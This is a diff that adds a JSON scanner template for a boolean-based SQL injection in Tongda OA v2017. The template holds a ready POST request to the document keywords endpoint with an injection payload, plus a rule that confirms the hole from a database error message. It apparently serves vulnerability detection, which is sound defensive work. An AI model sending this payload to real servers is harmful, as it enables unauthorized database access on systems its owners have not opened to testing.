@@ -1,0 +1,35 @@
+{
+  "product": "通达OA",
+  "vul_name": "通达OA v2017 general_document_index.php_setting_keywords_index 接口SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "通达OA v2017-布尔型SQL注入(/general/document/index.php/setting/keywords/index)",
+  "version": "通达OA 2017",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "https://baijiahao.baidu.com/s?id=1722749185213172939&wfr=spider&for=pc",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/general/document/index.php/setting/keywords/index",
+      "data": {
+        "_SERVER[QUERY_STRING]": "category=1'+and@`'`+or+if('ot'='oot',1,exp(710))--+-"
+      }
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "body": "SQL语句执行错误"
+        }
+      ]
+    }
+  }
+}
